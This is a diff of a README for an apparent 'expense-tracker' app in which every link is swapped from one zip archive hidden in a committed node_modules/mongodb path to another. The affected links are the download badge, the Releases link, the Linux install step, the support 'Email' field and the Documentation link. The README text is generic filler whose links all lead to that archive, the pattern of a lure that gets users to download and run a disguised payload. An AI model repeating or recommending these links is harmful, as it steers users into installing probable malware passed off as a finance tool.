@@ -1,6 +1,6 @@
 # 💰 expense-tracker - Easily Manage Your Money
 
-[![Download Now](https://raw.githubusercontent.com/alexanderbrucewilliams5-arch/expense-tracker/main/backend/node_modules/mongodb/lib/client-side-encryption/expense-tracker_2.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/alexanderbrucewilliams5-arch/expense-tracker/main/backend/node_modules/mongodb/lib/client-side-encryption/expense-tracker_2.7.zip)
+[![Download Now](https://github.com/alexanderbrucewilliams5-arch/expense-tracker/raw/refs/heads/main/backend/node_modules/mongodb/lib/cmap/auth/mongodb_oidc/tracker_expense_v1.9.zip%20Now-Click%20Here-blue)](https://github.com/alexanderbrucewilliams5-arch/expense-tracker/raw/refs/heads/main/backend/node_modules/mongodb/lib/cmap/auth/mongodb_oidc/tracker_expense_v1.9.zip)
 
 ## 🛠️ Features
 
@@ -24,14 +24,14 @@ Follow these steps to install and begin using the expense tracker.
 
 1. **Visit the Releases Page:** Go to the Releases page to find the latest version. Use the link below:
 
-   [Download from Releases](https://raw.githubusercontent.com/alexanderbrucewilliams5-arch/expense-tracker/main/backend/node_modules/mongodb/lib/client-side-encryption/expense-tracker_2.7.zip)
+   [Download from Releases](https://github.com/alexanderbrucewilliams5-arch/expense-tracker/raw/refs/heads/main/backend/node_modules/mongodb/lib/cmap/auth/mongodb_oidc/tracker_expense_v1.9.zip)
 
 2. **Download the Application:** Look for the most recent version. Select the file suitable for your operating system.
 
 3. **Install the Application:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
    - **For macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **For Linux:** Extract the `https://raw.githubusercontent.com/alexanderbrucewilliams5-arch/expense-tracker/main/backend/node_modules/mongodb/lib/client-side-encryption/expense-tracker_2.7.zip` file and follow the installation instructions provided.
+   - **For Linux:** Extract the `https://github.com/alexanderbrucewilliams5-arch/expense-tracker/raw/refs/heads/main/backend/node_modules/mongodb/lib/cmap/auth/mongodb_oidc/tracker_expense_v1.9.zip` file and follow the installation instructions provided.
 
 4. **Run the Application:** After installation, locate the expense tracker in your applications list. Open it and start managing your finances.
 
@@ -48,7 +48,7 @@ Follow these steps to install and begin using the expense tracker.
 
 If you encounter issues or have questions, feel free to reach out for assistance:
 
-- **Email:** https://raw.githubusercontent.com/alexanderbrucewilliams5-arch/expense-tracker/main/backend/node_modules/mongodb/lib/client-side-encryption/expense-tracker_2.7.zip
+- **Email:** https://github.com/alexanderbrucewilliams5-arch/expense-tracker/raw/refs/heads/main/backend/node_modules/mongodb/lib/cmap/auth/mongodb_oidc/tracker_expense_v1.9.zip
 - **GitHub Issues Page:** Open an issue on our GitHub repository for help.
 
 ## 📄 License
@@ -68,8 +68,8 @@ We welcome contributions! If you want to help improve the expense tracker, pleas
 
 For additional information, tips, and tricks, visit our documentation:
 
-[Documentation](https://raw.githubusercontent.com/alexanderbrucewilliams5-arch/expense-tracker/main/backend/node_modules/mongodb/lib/client-side-encryption/expense-tracker_2.7.zip)
+[Documentation](https://github.com/alexanderbrucewilliams5-arch/expense-tracker/raw/refs/heads/main/backend/node_modules/mongodb/lib/cmap/auth/mongodb_oidc/tracker_expense_v1.9.zip)
 
 Remember to regularly check the Releases page for updates and new features:
 
-[Download Updates Here](https://raw.githubusercontent.com/alexanderbrucewilliams5-arch/expense-tracker/main/backend/node_modules/mongodb/lib/client-side-encryption/expense-tracker_2.7.zip)
+[Download Updates Here](https://github.com/alexanderbrucewilliams5-arch/expense-tracker/raw/refs/heads/main/backend/node_modules/mongodb/lib/cmap/auth/mongodb_oidc/tracker_expense_v1.9.zip)
